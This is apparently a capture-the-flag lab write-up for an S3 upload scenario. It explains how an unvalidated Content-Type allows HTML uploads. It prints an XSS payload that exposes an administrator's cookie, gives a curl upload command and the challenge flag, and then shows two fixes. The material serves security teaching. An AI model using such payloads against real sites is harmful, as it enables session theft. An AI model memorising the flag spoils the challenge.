# Scenario 1 - Uploading Arbitrary HTML Files Using SDK

[Japanese](./README.md)

## Launch

```sh
cdk deploy Scenario1
# Or
docker compose run --rm cdk bash -c "cdk deploy Scenario1"
```

## Overview

This scenario involves an application that simulates file uploads to S3 using AWS SDK, with an administrator being the target of the challenge. The ultimate goal of the challenge is to retrieve the cookies of the administrator who handles customer inquiries.

**Similar Scenarios**

- [Scenario 2 - Uploading Arbitrary HTML Files Using Signed URLs](../scenario2/README.en.md)
- [Scenario 3 - Uploading Arbitrary HTML Files Using POST Policy](../scenario3/README.en.md)

The administrator's actions are simulated by the "Administrator Operation Mock." The administrator views the application URL sent by the user and saves the results to the `/delivery` directory in S3.

![Architecture of Scenario1](design.png)

## Solution

This section explains how to solve the scenario.

### Application Behavior

The target application operates as follows:

1. The user sends a request to upload a file to the application's endpoint.
2. The application receives the request and uploads the file to S3.
   - During this process, the application generates a UUIDv4 and uses it as the file name for the S3 upload.
3. S3 receives and stores the file.
4. The application returns the file name to the user.
5. The user can access the file using the provided file name.

Notably, no specific checks are performed on the files uploaded to S3.

### Reviewing the Source Code

Having outlined the application behavior, let’s review the source code implementation. Refer to `cdk/lib/scenario1/application/src/app.ts`.

The `/api/upload` endpoint is implemented as follows:

```typescript
server.post('/api/upload', async (request, reply) => {
  const data = await request.file({
    limits: {
      fileSize: 1024 * 1024 * 100,
      files: 1,
    },
  });
  if (!data) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    Body: data.file,
    ContentLength: data.file.bytesRead,
    ContentType: data.mimetype,
  });

  await s3.send(command);
  reply.send(`/upload/${filename}`);
  return reply;
});
```

Here, files are uploaded directly to S3, and as evident from the line `ContentType: data.mimetype,`, the `Content-Type` value from the request is passed directly to S3. This allows users to upload HTML files directly.

### Exploitation Strategy

In this challenge, the objective is to upload a browser-recognizable HTML file, use it to execute arbitrary JavaScript, and extract the administrator's cookies.

One approach involves uploading the following HTML file to execute JavaScript in the administrator’s browser, rendering their cookies as HTML content:

```html
<!-- xss.html -->
<html>
  <body>
    <script>
      document.getElementsByTagName('body')[0].innerHTML = `${document.cookie.split('=')[1]}`;
    </script>
  </body>
</html>
```

Save this file as `xss.html`. Then, execute the following command to upload the arbitrary HTML file:

```sh
TARGET_HOST="....."
curl -X POST -F "file=@xss.html" https://${TARGET_HOST}/api/upload
```

After uploading, enter the resulting URL into the Report URL field to execute arbitrary JavaScript in the administrator’s browser. After execution, view the file saved in `/delivery/{uuid}` in S3 to access the administrator's cookie-rendered HTML file.

## Challenge Response

```
flag{bfe061955a7cf19b12ff0f224e88d65a470e800a}
```

## Fixing the Uploader

Finally, here’s how to fix the uploader.

In `cdk/lib/scenario1/application/src/app.ts`, the `/api/upload` endpoint implementation lacks checks on the `Content-Type` value. Countermeasures include performing exact checks on `Content-Type` values or hardcoding `Content-Type` values for uploads.

**Fix 1: Validate `Content-Type`**

```typescript
server.post('/api/upload', async (request, reply) => {
  const data = await request.file({
    limits: {
      fileSize: 1024 * 1024 * 100,
      files: 1,
    },
  });
  if (!data) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});

  // Fix: Validate MimeType
  const allowedMimeTypes = ['image/png', 'image/jpeg', 'image/gif'];
  if (!allowedMimeTypes.includes(data.mimetype)) {
    return reply.code(400).send({ error: 'Invalid file type' });
  }

  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    Body: data.file,
    ContentLength: data.file.bytesRead,
    ContentType: data.mimetype,
  });

  await s3.send(command);
  reply.send(`/upload/${filename}`);
  return reply;
});
```

**Fix 2: Hardcode `Content-Type`**

```typescript
server.post('/api/upload', async (request, reply) => {
  const data = await request.file({
    limits: {
      fileSize: 1024 * 1024 * 100,
      files: 1,
    },
  });
  if (!data) {
    return reply.code(400).send({ error: 'No file uploaded' });
  }

  const filename = uuidv4();
  const s3 = new S3Client({});
  const command = new PutObjectCommand({
    Bucket: process.env.BUCKET_NAME,
    Key: `upload/${filename}`,
    Body: data.file,
    ContentLength: data.file.bytesRead,
    // Fix: Hardcode ContentType
    ContentType: 'application/octet-stream',
    ContentDisposition: `attachment; filename="${filename}.png"`,
  });
  await s3.send(command);
  reply.send(`/upload/${filename}`);
  return reply;
});
```
